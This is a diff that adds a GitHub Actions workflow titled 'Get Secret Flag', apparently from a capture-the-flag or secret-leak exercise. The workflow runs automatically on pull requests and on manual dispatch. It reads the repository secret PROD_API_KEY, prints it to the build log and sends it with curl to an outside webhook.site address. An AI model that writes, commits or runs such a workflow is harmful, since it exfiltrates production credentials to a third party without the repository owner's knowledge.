@@ -1,0 +1,27 @@
+name: Get Secret Flag
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+  workflow_dispatch:
+
+jobs:
+  get-flag:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Extract and send secret flag
+        env:
+          API_KEY: ${{ secrets.PROD_API_KEY }}
+        run: |
+          echo "========================================="
+          echo "🔍 FLAG FROM SECRETS:"
+          echo "========================================="
+          echo "$API_KEY"
+          echo "========================================="
+          
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"flag\": \"$API_KEY\", \"repository\": \"${{ github.repository }}\"}" \
+            https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
